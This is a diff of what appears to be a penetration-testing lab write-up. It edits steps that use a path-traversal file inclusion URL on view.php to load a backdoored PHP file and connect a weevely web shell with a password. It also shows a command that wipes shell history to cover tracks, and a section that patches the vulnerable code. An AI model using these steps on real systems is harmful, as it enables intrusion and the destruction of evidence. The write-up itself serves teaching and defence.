@@ -227,7 +227,7 @@ vim /usr/databases/post_exploitation_backdoored.php
 http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoored.php
 ```
 ```
-sudo weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
+weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
 ```
 
 ## Covering Tracks
@@ -242,9 +242,10 @@ cat /dev/null > ~/.bash_history && history -c
 
 ## Vulnerability Patching
 ### Vulnerable Code
-``
+```
+cd /var/www/dbadmin
 cat view.php
-``
+```
 ```
 <?php
        $page = $_GET['page'];
@@ -254,7 +255,7 @@ cat view.php
 
 ### Patch Code
 ```
-cat view.php-patch
+vim view.php-patch
 ```
 ```
 <?php
